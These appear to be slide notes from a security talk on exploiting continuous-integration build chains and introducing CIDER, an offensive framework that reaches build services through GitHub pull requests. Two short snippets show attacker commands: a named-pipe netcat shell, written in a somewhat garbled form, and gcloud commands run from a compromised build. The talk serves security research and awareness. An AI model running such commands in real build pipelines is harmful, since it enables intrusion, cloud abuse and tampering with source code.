# Exploiting Continuous Integration (CI) and Automated Build Systems
## Introducing CIDER

### Whoami
- **SpaceB0x**
- Senior Security Engineer at LeanKit
- Specializes in application and network security (offense and defense)
- Enjoys breaking into systems, building systems, and continuous learning
- Security consultant

### Agenda
1. Overview of Continuous Integration (CI) concepts
2. Tools and build chain configurations
3. Common deployment bad practices
4. Real-world exploits
5. Introduction to CIDER

## Continuous Integration (CI)
Continuous Integration (CI) is a development practice where code changes are frequently integrated into a shared repository, followed by automated builds and tests. The goal is to have multiple deployments per day or week, ensuring that the codebase remains in a deployable state.

### Key Features
- **Quick Iterative Releases**: Code is released to production servers rapidly.
- **Repository-Centric**: CI systems are tightly integrated with version control repositories.
- **Automated Build Chains**: In sync with automated build and deployment processes.
- **Applicability**: Used for infrastructure, servers, subnets, and code.

### Microservices
Microservices involve breaking down large applications into small, decoupled components, each designed to do one or two things well. These services are developed autonomously, leading to more modular and scalable systems.

## Security Implications
### Benefits
- **Frequent Release Cycles**: Facilitates rapid bug fixes and updates.
- **Faster Deployments**: Enables quick remediation of security issues.
- **Reduced Single Points of Failure**: Decoupled systems minimize the impact of a single service compromise.
- **Isolation**: Compromise of one service does not necessarily mean full system pwnage.

### Risks
- **Hasty Oversight**: Fast release cycles can lead to overlooked vulnerabilities.
- **Less Scrutiny**: Automated deployment systems may be less thoroughly checked than the code they deploy.
- **Identity Management**: Poorly managed identities can be exploited.

## Tools
### Build Systems
Build systems take code and conditionally build it, often in a containerized environment. Popular vendors include:
- Travis-CI
- Circle-CI
- Drone
- TeamCity
- BuildKite

### Deployment Systems
Deployment systems handle the deployment of built code. They are increasingly moving towards container-driven solutions. Vendors include:
- Jenkins
- Octopus Deploy
- Kubernetes
- Rancher
- Mesosphere

## Chains of Deployment
### Configuration Exposure
- **Code Builds Before Merging**: Builds triggered from pull requests (PRs), commits, etc.
- **Repos Hold Downstream Instructions**: Build configurations are often stored in the root of the repository.
- **Vulnerabilities in Misconfiguration**: Creative exploitation of misconfigurations, especially in the interaction between services.

### External Repositories
- **Volatile Attack Surface**: Public repositories that map to internal build services can be targeted.

## Attacking Build Servers
### Main Attack Vectors
- **Pre/Post Commands**: Manipulating commands executed before or after the build.
- **Image Specification**: Tampering with the build image specifications.
- **Test Builds**: Exploiting test builds to gain unauthorized access.

### Real-World Exploit #1
```bash
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe
nc –l 4444
```
- **Questions**:
  - Who is aware of this?
  - What are the implications?
  - What is the attack surface?

### Existing Pwnage
- **@claudijd and RottenApple**: A framework for exploiting CI (Jenkins) via Ruby code builds, including an audit framework and attack surface analysis.

### Who Cares?
- **Cloud-Based**: Can clog up deployment chains, create botnets for DDoS attacks, and mine cryptocurrencies.
- **On-Prem/Self-Hosted**: Can lead to network takeover, alteration of source repositories, and downstream production deployments.

### Bad Practices for Hosted Services
- **Environment Variables**: Storing credentials and metadata in environment variables.
- **Running as Root**: Running containers with root privileges, providing internal network access and full control over the build image.

### Real-World Exploit #2
```bash
sudo gcloud compute project-info describe
sudo gcloud compute networks create testnetwork –mode auto
```

## Introducing CIDER
### What is CIDER?
CIDER (Continuous Integration and Deployment ExploiteR) is a framework for exploiting and attacking CI build chains. It primarily leverages GitHub as an attack surface to reach build services, simplifying the process of forking, PR-ing, and callbacking. CIDER can poison a handful of build services and "exploits" for each one.

### Why CIDER?
- **Fun**: For ethical hacking and research.
- **Ease of Use**: Simplifies the process of attacking CI/CD pipelines.
- **Awareness**: Raises awareness about potential vulnerabilities.
- **Research**: Facilitates further research and development.

### CIDER Overview
- **Node.JS**: Built using Node.js for modularity.
- **Bulk Target Handling**: Can handle bulk lists of target repositories.
- **GitHub Cleanup**: Manages GitHub repository complexities.
- **Ngrok**: Uses Ngrok for port forwarding and public IP management.

### Disclaimer
- **GitHub User Agreement**: Testing against a repository, even with permission, is against GitHub's user agreement.
- **Ownership Requirement**: You must be the owner of the repository to test it.
- **Owner Permission**: Ask the repository owner to make you an owner for testing purposes.

### Demo
- **Limitations**:
  - Build Queues
  - GitHub Noise
  - Timeouts
  - Repo API Request Throttling

### Future Work
- **More CI Frameworks**: Expand to other CI/CD frameworks.
- **Deployment Services**: Tackle deployment services.
- **Other Entry Points**: Explore other entry points and code repositories.
- **ChatOps (Slack)**: Integrate with chat operations tools like Slack.

### Thanks
- **LeanKit Operations Team**
- **Evan Snapp**
- **@claudijd**
- **Wife++**

### Fin
- **CIDER on GitHub**: [https://github.com/spaceB0x/cider](https://github.com/spaceB0x/cider)
- **Twitter**: [@spaceB0xx](https://twitter.com/spaceB0xx)
- **Website**: [www.untamedtheory.com](http://www.untamedtheory.com)